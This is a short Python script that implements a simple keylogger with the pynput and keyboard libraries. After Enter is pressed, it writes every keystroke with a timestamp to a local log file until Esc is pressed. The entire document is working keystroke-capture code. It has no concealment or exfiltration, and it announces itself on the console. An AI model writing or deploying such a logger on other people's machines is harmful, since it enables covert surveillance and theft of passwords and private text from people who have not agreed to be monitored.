import pynput
import keyboard
from pynput.keyboard import Key, Listener
import logging

# Instructional welcome message 
print("Press 'Enter' to start Keylogger & 'Esc' to quit.")
while True:
    try:
        if keyboard.is_pressed('ENTER'):
            print("...Starting Keylogger...")
            break
    except:
        break

# Logs all of the imput information from the keyboard in the file chosen from the directory path. 
log_dir = r"C:/path/to/keylogger"
logging.basicConfig(filename = (log_dir + r"/keylog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(str(key))

# Esc key stops the script
    if key == Key.esc:
        print("...Stopping Keylogger...")
        return False

with Listener(on_press=on_press) as listener:
    listener.join()